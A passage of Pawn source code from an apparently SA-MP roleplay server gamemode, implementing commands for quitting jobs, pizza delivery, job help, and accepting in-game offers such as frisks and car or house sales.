		if(sscanf(params, "d", jobid))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /quitjob [jobid]");
			SendClientMessage(playerid, COLOR_GREY, "Available: 1, 2");
			return 1;
		}

		switch(jobid)
		{
			case 1:
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You have quit your Job.");
				PlayerInfo[playerid][pJob] = 0;

				if(GetPVarType(playerid, "NPS") != 0) {
			    	SetPlayerSkin(playerid, GetPVarInt(playerid, "NPS"));
			    	DeletePVar(playerid,"NPS");
				}
				JobDuty[playerid] = 0;
				if(PlayerInfo[playerid][pJob] == 7) {
					Mechanics -= 1;
				} else if(PlayerInfo[playerid][pJob] == 2) {
					Lawyers -= 1;
				}
				DestroyProgressBar(LoadTruckBar[playerid]);
				LoadTruckBar[playerid] = INVALID_BAR_ID;
				LoadTruckTime[playerid] = 0;
				DeletePVar(playerid, "TruckDeliver");
				TruckUsed[playerid] = INVALID_VEHICLE_ID;
				gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
				DisablePlayerCheckpoint(playerid);
			}
			case 2:
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You have quit your secondary Job.");
				PlayerInfo[playerid][pJob2] = 0;

				if(GetPVarType(playerid, "NPS") != 0) {
			    	SetPlayerSkin(playerid, GetPVarInt(playerid, "NPS"));
			    	DeletePVar(playerid,"NPS");
				}
				JobDuty[playerid] = 0;
				if(PlayerInfo[playerid][pJob2] == 7) {
					Mechanics -= 1;
				} else if(PlayerInfo[playerid][pJob2] == 2) {
					Lawyers -= 1;
				}
				DestroyProgressBar(LoadTruckBar[playerid]);
				LoadTruckBar[playerid] = INVALID_BAR_ID;
				LoadTruckTime[playerid] = 0;
				DeletePVar(playerid, "TruckDeliver");
				TruckUsed[playerid] = INVALID_VEHICLE_ID;
				gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
				DisablePlayerCheckpoint(playerid);
			}
			default:
			{
				SendClientMessage(playerid, COLOR_WHITE, "USAGE: /quitjob [jobid]");
				SendClientMessage(playerid, COLOR_GREY, "Available: 1, 2");
			}
		}
	}
	else
	{
		if(PlayerInfo[playerid][pJob] > 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You have quit your Job.");
			PlayerInfo[playerid][pJob] = 0;

			if(GetPVarType(playerid, "NPS") != 0) {
			    SetPlayerSkin(playerid, GetPVarInt(playerid, "NPS"));
			    DeletePVar(playerid,"NPS");
			}
			JobDuty[playerid] = 0;
			if(PlayerInfo[playerid][pJob] == 7) {
				Mechanics -= 1;
			} else if(PlayerInfo[playerid][pJob] == 2) {
				Lawyers -= 1;
			}
			DestroyProgressBar(LoadTruckBar[playerid]);
			LoadTruckBar[playerid] = INVALID_BAR_ID;
			LoadTruckTime[playerid] = 0;
			DeletePVar(playerid, "TruckDeliver");
			TruckUsed[playerid] = INVALID_VEHICLE_ID;
			gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
			DisablePlayerCheckpoint(playerid);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You don't even have a Job!");
		}
	}
	return 1;
}

CMD:getpizza(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 21 && PlayerInfo[playerid][pJob2] != 21)
	{
		SendClientMessage(playerid,COLOR_GREY,"   You're not a Pizza Boy!");
		return 1;
	}
    new vehicleid = GetPlayerVehicleID(playerid);
    if(!(IsAPizzaCar(vehicleid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER))
	{
	    SendClientMessage(playerid,COLOR_GREY,"   You need to be driving a pizzaboy found at the side of the Pizza Stack!");
	    return 1;
	}
	if(!(GetPlayerSkin(playerid) == 155))
	{
	    SendClientMessage(playerid,COLOR_GREY,"   You need to be in the Pizza Stack uniform!");
	    return 1;
	}
	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, -1726.92, 1359.93, 7.19))
	{
		SendClientMessage(playerid,COLOR_GREY,"   You're not at the Pizza Stack pickup!");
		return 1;
	}
	if(GetPVarInt(playerid, "Pizza") > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're already delivering pizzas!");
		return 1;
	}

	new rand = random(165);
	while(!(HouseInfo[rand][hExteriorZ] < 150.0 && HouseInfo[rand][hExteriorX] > 17.59 && HouseInfo[rand][hExteriorX] < -1711.64 && HouseInfo[rand][hExteriorY] < 1344.45 && HouseInfo[rand][hExteriorY] > 7.25))
	{
	    rand++;
	    if(rand == 165) {
	    	rand = 1;
		}
		//printf("%d", rand);
	}

	SetPVarInt(playerid, "tpPizzaTimer", floatround((GetPizzaDistance(rand) / 60), floatround_round));
	SetPVarInt(playerid, "pizzaTotal", floatround((GetPizzaDistance(rand) / 10), floatround_round));
	SetPVarInt(playerid, "pizzaTimer", GetPVarInt(playerid, "pizzaTotal"));
 	SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPPIZZARUNTIMER);
 	SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_PIZZATIMER);
	new szMessage[128];

 	if(HouseInfo[rand][hOwned] == 0)
 	{
 	    format(szMessage, sizeof(szMessage), "You have picked up a pizza for someone. You have %d seconds to deliver it!", GetPVarInt(playerid, "pizzaTotal"));
 	}
 	else
	{
		format(szMessage, sizeof(szMessage), "You have picked up a pizza for %s. You have %d seconds to deliver it!", HouseInfo[rand][hOwner], GetPVarInt(playerid, "pizzaTotal"));
	}

	SendClientMessage(playerid, COLOR_WHITE, szMessage);
	SetPVarInt(playerid, "Pizza", rand);
	PizzaBar[playerid] = CreateProgressBar(258.00, 137.00, 131.50, 3.19, COLOR_GREY, 100.0);
	SetProgressBarValue(PizzaBar[playerid], 100.0);
	ShowProgressBarForPlayer(playerid, PizzaBar[playerid]);
	SetPlayerCheckpoint(playerid, HouseInfo[rand][hExteriorX], HouseInfo[rand][hExteriorY], HouseInfo[rand][hExteriorZ], 5);
	return 1;
}

CMD:jobhelp(playerid, params[]) {
    return ShowPlayerDialogEx(playerid, JOBHELPMENU, DIALOG_STYLE_LIST, "Which job do you need help with?","Detective\nLawyer\nWhore\nDrug Dealer\nMechanic\nBodyguard\nArms Dealer\nBoxer\nTaxi Driver\nDrug Smuggling\nCraftsman\nBartender\nTrucker\nPizza Boy", "Select", "Cancel");
}

CheckPointCheck(iTargetID) {
	if(GetPVarType(iTargetID, "Packages") || FindingJob[iTargetID] != 0 || FindingDealership[iTargetID] != 0 || TaxiAccepted[iTargetID] != 999 || EMSAccepted[iTargetID] != INVALID_PLAYER_ID || BusAccepted[iTargetID] != 999 ||  MedicAccepted[iTargetID] != 999 || MechanicCallTime[iTargetID] >= 1 || gPlayerCheckpointStatus[iTargetID] != CHECKPOINT_NONE || CP[iTargetID] != 0 || GetPVarType(iTargetID, "CrateDeliver") || GetPVarType(iTargetID, "TrackCar")) return 1;
	else return 0;
}

CMD:accept(playerid, params[])
{
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}
	new string[128];
	new sendername[MAX_PLAYER_NAME];
	new giveplayer[MAX_PLAYER_NAME];
	//new giveplayerid;
    if(IsPlayerConnected(playerid)) {
        if(isnull(params)) {
            SendClientMessage(playerid, COLOR_WHITE, "USAGE: /accept [name]");
            SendClientMessage(playerid, COLOR_GREY, "Available names: Sex, Mats, Crack, Pot, Weapon, Craft, Repair, Bodyguard, Job, Divorce, Frisk, Marriage");
            SendClientMessage(playerid, COLOR_GREY, "Available names: Faction, Family, Taxi, Bus, Boxing, Medic, Mechanic, Ticket, Car, Death, Live");
            return 1;
        }
	    if(strcmp(params,"job",true) == 0) {

	        if(GettingJob[playerid] > 0) {
	            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Congratulations with your new Job, type /help to see your new command.");
	            if(GettingJob[playerid] == 14) {
	                SendClientMessage(playerid, COLOR_WHITE, "HINT: You can find drug crates in Blueberry. (Go to checkpoint)");
	                if(CheckPointCheck(playerid)) {
    	            	PlayerInfo[playerid][pJob] = GettingJob[playerid];
	            		GettingJob[playerid] = 0;
	                    SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
	                    return 1;
	                }
	                SetPlayerCheckpoint(playerid, 51.9720,-292.6349,1.7031, 3);
	            }
	            if(GettingJob[playerid] == 21) {
	            	SendClientMessage(playerid, COLOR_WHITE, "You have been given a Pizza Stack uniform!");
	            	SetPVarInt(playerid, "NPS", GetPlayerSkin(playerid)); // non pizza skin
					PlayerInfo[playerid][pSkin] = 155;
					SetPlayerSkin(playerid, 155);
	            }
	            PlayerInfo[playerid][pJob] = GettingJob[playerid];
	            GettingJob[playerid] = 0;
	            return 1;
	        }
         	if(GettingJob2[playerid] > 0) {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Congratulations with your new Job, type /help to see your new command.");
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You have taken this as a secondary job.");
	            if(GettingJob[playerid] == 14) {
	                SendClientMessage(playerid, COLOR_WHITE, "HINT: You can find drug crates in Blueberry. (Go to checkpoint)");
	                if(CheckPointCheck(playerid)) {
    	            	PlayerInfo[playerid][pJob] = GettingJob[playerid];
	            		GettingJob[playerid] = 0;
	                    SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
	                    return 1;
	                }
	                SetPlayerCheckpoint(playerid, 51.9720,-292.6349,1.7031, 3);
	            }
	            if(GettingJob[playerid] == 21) {
	            	SendClientMessage(playerid, COLOR_WHITE, "You have been given a Pizza Stack uniform!");
	            	SetPVarInt(playerid, "NPS", GetPlayerSkin(playerid)); // non pizza skin
					PlayerInfo[playerid][pSkin] = 155;
					SetPlayerSkin(playerid, 155);
	            }
                PlayerInfo[playerid][pJob2] = GettingJob2[playerid];
                GettingJob2[playerid] = 0;
                return 1;
            }
	        else {
	            SendClientMessage(playerid, COLOR_GREY, "   You haven't even been at a job place yet!");
	            return 1;
	        }
	    }
		if(strcmp(params,"live",true) == 0) {
            if(LiveOffer[playerid] != INVALID_PLAYER_ID) {
                if(IsPlayerConnected(LiveOffer[playerid])) {
                    if (ProxDetectorS(5.0, playerid, LiveOffer[playerid])) {
                        SendClientMessageEx(playerid, COLOR_LIGHTBLUE, "* You are frozen till the Live Conversation ends.");
                        SendClientMessageEx(LiveOffer[playerid], COLOR_LIGHTBLUE, "* You are frozen till the Live Conversation ends (use /live again).");
                        TogglePlayerControllable(playerid, 0);
                        TogglePlayerControllable(LiveOffer[playerid], 0);
                        TalkingLive[playerid] = LiveOffer[playerid];
                        TalkingLive[LiveOffer[playerid]] = playerid;
                        IsTheReporter[LiveOffer[playerid]] = 1;
                        LiveOffer[playerid] = INVALID_PLAYER_ID;
                        return 1;
                    } else return SendClientMessageEx(playerid, COLOR_GREY, "   You are to far away from the News Reporter!");
                } else {
					SendClientMessageEx(playerid, COLOR_GREY, "   The News Reporter is now off line!");
					LiveOffer[playerid] = INVALID_PLAYER_ID;
				}
            } else return SendClientMessageEx(playerid, COLOR_GREY, "   No-one gave you a Live Conversation offer!");
        }
	    if(strcmp(params,"frisk",true) == 0) {
	        if(GetPVarType(playerid, "FriskREQ") == 0)
	            return SendClientMessage(playerid, COLOR_GREY, "You do not have any requests to be frisked.");

			format(string, sizeof(string), "* %s has accepted your frisk request.", GetPlayerNameEx(playerid));
			SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_LIGHTBLUE, string);

			SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREEN, "_______________________________________");
			format(string, sizeof(string), "*** %s' items...  ***", GetPlayerNameEx(playerid));
			SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_WHITE, string);

			if(PlayerInfo[playerid][pWSeeds] == 1)
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, "Marijuana Seeds");

			if(PlayerInfo[playerid][pPhoneBook] > 0)
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, "Phone book.");

			if(PlayerInfo[playerid][pCDPlayer] > 0)
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, "CD player.");

			if(PlayerInfo[playerid][pCrack] > 0) {
				format(string, sizeof(string), "%d grams of crack.", PlayerInfo[playerid][pCrack]);
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, string);
			}
			if(PlayerInfo[playerid][pPot] > 0) {
				format(string, sizeof(string), "%d grams of pot.", PlayerInfo[playerid][pPot]);
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, string);
			}
			if(PlayerInfo[playerid][pMats] > 0) {
				format(string, sizeof(string), "%d materials.", PlayerInfo[playerid][pMats]);
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, string);
			}
			if(Fishes[playerid][pWeight1] > 0 || Fishes[playerid][pWeight2] > 0 || Fishes[playerid][pWeight3] > 0 || Fishes[playerid][pWeight4] > 0 || Fishes[playerid][pWeight5] > 0) {
				format(string, sizeof(string), "%d fish.", PlayerInfo[playerid][pFishes]);
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, string);
			}

			new weaponname[50];
			format(string, sizeof(string), "*** %s' weapons...  ***", GetPlayerNameEx(playerid));
			SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_WHITE, string);

			for(new i = 0; i < 12; i++) {
				if(PlayerInfo[playerid][pGuns][i] > 0) {
					GetWeaponName(PlayerInfo[playerid][pGuns][i], weaponname, sizeof(weaponname));
					format(string, sizeof(string), "Weapon: %s.", weaponname);
					SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GRAD1, string);
				}
			}

			SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREEN, "_______________________________________");
			format(string, sizeof(string), "* %s has frisked %s.", GetPlayerNameEx(GetPVarInt(playerid, "FriskREQ")),GetPlayerNameEx(playerid));
			ProxDetector(30.0, GetPVarInt(playerid, "FriskREQ"), string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

			DeletePVar(playerid, "FriskREQ");
		}
     	if(strcmp(params,"death",true) == 0) {
            if(GetPVarInt(playerid, "Injured") == 1) {
                SendClientMessage(playerid, COLOR_WHITE, "You gave up hope and fell unconscious, you were immediately sent to the hospital.");
                KillEMSQueue(playerid);
                ResetPlayerWeaponsEx(playerid);
                SpawnPlayer(playerid);
            }
            else {  SendClientMessage(playerid, COLOR_GREY, "   You're not injured, you can't do this right now!"); }
        }
        if(strcmp(params,"drink",true) == 0) {
            if((DrinkOffer[playerid] != INVALID_PLAYER_ID) && (IsPlayerConnected(DrinkOffer[playerid]))) {
                if(ProxDetectorS(8.0, playerid, DrinkOffer[playerid])) {
                    ShowPlayerDialogEx(playerid, DRINKLISTDIALOG, DIALOG_STYLE_LIST, "Available Drinks", "Beer ($60)\nVodka ($100)\nWhiskey ($100)\nWater ($20)\nSoda($20)", "Purchase", "Cancel");
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "You're too far away from the bartender.");
                    DrinkOffer[playerid] = INVALID_PLAYER_ID;
                    return 1;
                }
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, " No-one has offered you a drink.");
                return 1;
            }
        }
        if(strcmp(params,"car",true) == 0) {
            if(VehicleOffer[playerid] < 999) {
                if(IsPlayerConnected(VehicleOffer[playerid])) {
                    if(GetPlayerCash(playerid) > VehiclePrice[playerid]) {
                        if(IsPlayerInVehicle(VehicleOffer[playerid], PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvId])) {
                            if(!ProxDetectorS(8.0, VehicleOffer[playerid], playerid)) return SendClientMessage(playerid, COLOR_GREY, "You're not near the car dealer");
                            new playervehicleid = GetPlayerFreeVehicleId(playerid),
								totalvehicles = GetPlayerVehicleCountEx(playerid);

							// (TEMPORARY - ZHAO NOTE) TempVIP not added yet
			 				if(PlayerInfo[playerid][pVip] == 0 && totalvehicles >= 5) //PlayerInfo[playerid][pTempVIP] > 0) && carsamount >= 5)
							{
                				SendClientMessage(playerid, COLOR_GREY, "ERROR: You can't have more cars, non-VIP can only own 5 cars.");
                				return 1;
							}
            				if(PlayerInfo[playerid][pVip] == 1 && totalvehicles >= 7)
 					 		{
   					 			SendClientMessage(playerid, COLOR_GREY, "ERROR: You can't have more cars, Bronze VIP can only own 7 cars.");
                				return 1;
            				}
            				if(PlayerInfo[playerid][pVip] == 2 && totalvehicles >= 8)
            				{
          					 	SendClientMessage(playerid, COLOR_GREY, "ERROR: You can't have more cars, Silver VIP can only own 8 cars.");
           					 	return 1;
           					}
            				if(PlayerInfo[playerid][pVip] == 3 && totalvehicles >= 10)
            				{
                				SendClientMessage(playerid, COLOR_GREY, "ERROR: You can't have more cars, Diamond Donator can only own 10 cars.");
                				return 1;
            				}
		    				if(playervehicleid == -1)
		    				{
		        				SendClientMessage(playerid, COLOR_GREY, "ERROR: You can't have more cars.");
                				return 1;
		    				}
   							if(PlayerInfo[playerid][pVip] == 0 && VehicleSpawned[playerid] > 0)
							{
								SendClientMessage(playerid, COLOR_GREY, "As non-donator you can only have 1 vehicle spawned. You must store a vehicle in order to spawn another one.");
								return 1;
							}
							if(PlayerInfo[playerid][pVip] == 1 && VehicleSpawned[playerid] > 1)
				            {
								SendClientMessage(playerid, COLOR_GREY, "As Bronze VIP you can only have 2 vehicles spawned. You must store a vehicle in order to spawn another one.");
								return 1;
							}
							if(PlayerInfo[playerid][pVip] == 2 && VehicleSpawned[playerid] > 2)
							{
								SendClientMessage(playerid, COLOR_GREY, "As Silver-VIP you can only have 3 vehicles spawned. You must store a vehicle in order to spawn another one.");
								return 1;
							}
							if(PlayerInfo[playerid][pVip] == 3 && VehicleSpawned[playerid] > 3)
	 						{
								SendClientMessage(playerid, COLOR_GREY, "As Gold VIP you can only have 4 vehicles spawned. You must store a vehicle in order to spawn another one.");
								return 1;
			 				}
							if(PlayerInfo[playerid][pVip] < 0 || PlayerInfo[playerid][pVip] > 3)
							{
								SendClientMessage(playerid, COLOR_GREY, "You have an invalid Donator level.");
								return 1;
							}

                            new ip[32], ipex[32];
                            GetPlayerIp(playerid, ip, sizeof(ip));
                            GetPlayerIp(VehicleOffer[playerid], ipex, sizeof(ipex));
                            format(string, sizeof(string), "[CAR] %s (IP: %s) has paid $%d to %s for the %s (IP: %s)", GetPlayerNameEx(playerid), ip, VehiclePrice[playerid], GetPlayerNameEx(VehicleOffer[playerid]), GetVehicleName(PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvId]), ipex);
                            Log("logs/pay.log", string);
                            GetPlayerName(VehicleOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* You bought the %s for $%d, from %s. (Check /carhelp for more help)", GetVehicleName(PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvId]), VehiclePrice[playerid],giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* You sold your %s to %s for $%d.",GetVehicleName(PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvId]), sendername,VehiclePrice[playerid]);
                            SendClientMessage(VehicleOffer[playerid], COLOR_LIGHTBLUE, string);
                            GivePlayerCash(VehicleOffer[playerid], VehiclePrice[playerid]);
                            GivePlayerCash(playerid, -VehiclePrice[playerid]);
                            RemovePlayerFromVehicle(VehicleOffer[playerid]);
                            new Float:slx, Float:sly, Float:slz;
                            GetPlayerPos(VehicleOffer[playerid], slx, sly, slz);
                            SetPlayerPos(VehicleOffer[playerid], slx, sly, slz+2);
                            PlayerVehicleInfo[playerid][playervehicleid][pvId] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvId];
                            PlayerVehicleInfo[playerid][playervehicleid][pvModelId] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvModelId];
                            PlayerVehicleInfo[playerid][playervehicleid][pvPosX] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosX];
                            PlayerVehicleInfo[playerid][playervehicleid][pvPosY] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosY];
                            PlayerVehicleInfo[playerid][playervehicleid][pvPosZ] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosZ];
                            PlayerVehicleInfo[playerid][playervehicleid][pvPosAngle] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosAngle];
                            PlayerVehicleInfo[playerid][playervehicleid][pvLock] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvLock];
                            PlayerVehicleInfo[playerid][playervehicleid][pvLocked] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvLocked];
                            PlayerVehicleInfo[playerid][playervehicleid][pvPaintJob] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPaintJob];
                            PlayerVehicleInfo[playerid][playervehicleid][pvColor1] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvColor1];
                            PlayerVehicleInfo[playerid][playervehicleid][pvColor2] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvColor2];
                            PlayerVehicleInfo[playerid][playervehicleid][pvAllowedPlayerId] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvAllowedPlayerId];
                            PlayerVehicleInfo[playerid][playervehicleid][pvPark] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPark];
                            PlayerVehicleInfo[playerid][playervehicleid][pvRealID] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvRealID];
                            PlayerVehicleInfo[playerid][playervehicleid][pvSpawned] = 1;

                            new
                                szQuery[64];

							mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE playervehicles SET Owner = %d WHERE ID = %d", PlayerInfo[playerid][pID], GetPVarInt(playerid, "carsaleid"));
							mysql_tquery(sqldb,szQuery);

                            VehicleSpawned[playerid]++;

                            for(new m = 0; m < MAX_MODS; m++) {
                                PlayerVehicleInfo[playerid][playervehicleid][pvMods][m] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvMods][m];
                            }

                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvRealID] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvId] = INVALID_PLAYER_VEHICLE_ID;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvModelId] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosX] = 0.0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosY] = 0.0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosZ] = 0.0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosAngle] = 0.0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvLock] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvLocked] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPaintJob] = -1;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvColor1] = 0;
							PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvImpounded] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvColor2] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvAllowedPlayerId] = INVALID_PLAYER_ID;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPark] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvSpawned] = 0;
                            VehicleSpawned[VehicleOffer[playerid]]--;
                            for(new m = 0; m < MAX_MODS; m++) {
                                PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvMods][m] = 0;
                            }
                            VehicleOffer[playerid] = 999;
                            VehiclePrice[playerid] = 0;

                            DeletePVar(playerid, "carsaleid");

                            return 1;
                        }
                        else {
                            SendClientMessage(playerid, COLOR_GREY, "   The Car Dealer is not in the offered car!");
                            return 1;
                        }
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   You can't afford the car!");
                        return 1;
                    }
                }
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Nobody offered to buy a car!");
                return 1;
            }
        }
        if(strcmp(params,"house",true) == 0) {
            if(HouseOffer[playerid] < 999) {
                if(IsPlayerConnected(HouseOffer[playerid])) {
                    if(PlayerInfo[HouseOffer[playerid]][pHouse] == INVALID_HOUSE_ID)
                        return SendClientMessage(playerid, COLOR_WHITE, "They don't own that house.");

                    if(GetPlayerCash(playerid) > HousePrice[playerid]) {
                        new house;
                        if(House[playerid] == 1) house = PlayerInfo[HouseOffer[playerid]][pHouse];
                        else if(House[playerid] == 2) house = PlayerInfo[HouseOffer[playerid]][pHouse2];
                        else return SendClientMessage(playerid, COLOR_RED, "Error: No house specified");
                        ClearHouse(house);
                        HouseInfo[house][hLock] = 1;
                        format(HouseInfo[house][hOwner], 128, "Nobody");
                        sendername = GetPlayerNameEx(HouseOffer[playerid]);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        format(string, sizeof(string), "~w~Congratulations~n~ You have sold your property for ~n~~g~$%d", HousePrice[playerid]);
                        GameTextForPlayer(HouseOffer[playerid], string, 4000, 3);
                        if(House[playerid] == 1) PlayerInfo[HouseOffer[playerid]][pHouse] = INVALID_HOUSE_ID;
                        else PlayerInfo[HouseOffer[playerid]][pHouse2] = INVALID_HOUSE_ID;
                        SaveHouses();
                        OnPlayerStatsUpdate(HouseOffer[playerid]);
                        DestroyPickup(HouseInfo[house][hPickupID]);
                        HouseInfo[house][hPickupID] = CreatePickup(1273, 23, HouseInfo[house][hExteriorX], HouseInfo[house][hExteriorY], HouseInfo[house][hExteriorZ], -1);
                        GivePlayerCash(HouseOffer[playerid],HousePrice[playerid]);

                        PlayerInfo[playerid][pHouse] = house;
                        HouseInfo[house][hOwned] = 1;
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        strmid(HouseInfo[house][hOwner], sendername, 0, strlen(sendername), 255);
                        GivePlayerCash(playerid,-HousePrice[playerid]);
                        SendClientMessage(playerid, COLOR_WHITE, "Congratulations on your new purchase!");
                        SendClientMessage(playerid, COLOR_WHITE, "Type /help to review the property help section!");
                        SaveHouses();
                        OnPlayerStatsUpdate(playerid);
                        DestroyPickup(HouseInfo[house][hPickupID]);
                        HouseInfo[house][hPickupID] = CreatePickup(1273, 23, HouseInfo[house][hExteriorX], HouseInfo[house][hExteriorY], HouseInfo[house][hExteriorZ], -1);
                        format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[house][hOwner],HouseInfo[house][hLevel],house);
                        UpdateDynamic3DTextLabelText(HouseInfo[house][hTextID], COLOR_HOUSEGREEN, string);


                        new ip[32], ipex[32];
                        GetPlayerIp(HouseOffer[playerid],ip,sizeof(ip));
                        GetPlayerIp(playerid,ipex,sizeof(ipex));
                        format(string,sizeof(string),"%s (IP: %s) has sold their house (ID %d) to %s (IP: %s) for $%d.",GetPlayerNameEx(HouseOffer[playerid]),ip,house,GetPlayerNameEx(playerid),ipex,HousePrice[playerid]);
                        Log("logs/house.log", string);

                        HouseOffer[playerid] = 999;
                        HousePrice[playerid] = 0;
                        House[playerid] = 0;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "You can't afford the house.");
                        HouseOffer[playerid] = 999;
                        HousePrice[playerid] = 0;
                        House[playerid] = 0;
                        return 1;
                    }
                }
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "Nobody offered to buy a house.");
                return 1;
            }
        }
        else if(strcmp(params,"invite",true) == 0)
		{
            if(hInviteOffer[playerid] < 999)
			{
                if(IsPlayerConnected(hInviteOffer[playerid]))
				{
    				if(CheckPointCheck(playerid)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
                        return 1;
                    }
					hInviteHouse[playerid] = PlayerInfo[hInviteOffer[playerid]][pHouse];
                    format(string, sizeof(string), "* You have accepted %s's house invite, a checkpoint has been set to their house.", GetPlayerNameEx(hInviteOffer[playerid]));
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    format(string, sizeof(string), "* %s has accepted your house invite.", GetPlayerNameEx(playerid));
                    SendClientMessage(hInviteOffer[playerid], COLOR_LIGHTBLUE, string);
					DisablePlayerCheckpoint(playerid);
                    SetPlayerCheckpoint(playerid,HouseInfo[hInviteHouse[playerid]][hExteriorX], HouseInfo[hInviteHouse[playerid]][hExteriorY], HouseInfo[hInviteHouse[playerid]][hExteriorZ], 4.0);
                    gPlayerCheckpointStatus[playerid] = CHECKPOINT_HOME;
					//hInviteSlot[playerid] = 0;
                    hInviteOffer[playerid] = 999;
                    hInviteHouse[playerid] = INVALID_HOUSE_ID;
                    return 1;
                }
                else
				{
					//hInviteSlot[playerid] = 0;
                    hInviteOffer[playerid] = 999;
                    hInviteHouse[playerid] = INVALID_HOUSE_ID;
